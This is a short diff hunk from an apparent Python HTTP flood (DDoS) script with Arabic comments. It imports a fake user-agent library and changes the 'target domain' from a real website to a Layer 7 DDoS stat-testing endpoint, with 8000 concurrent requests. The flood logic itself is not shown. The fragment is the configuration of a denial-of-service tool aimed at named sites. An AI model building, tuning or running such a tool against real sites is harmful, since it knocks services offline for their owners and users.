@@ -29,7 +29,7 @@ import psutil
 from fake_useragent import UserAgent  # استيراد UserAgent من fake_useragent
 
 # النطاق (domain) الهدف
-URL = "http://slawat.net"
+URL = "https://request.layer7dstat.uk/"
 
 # عدد الطلبات المتزامنة
 CONCURRENT_REQUESTS = 8000
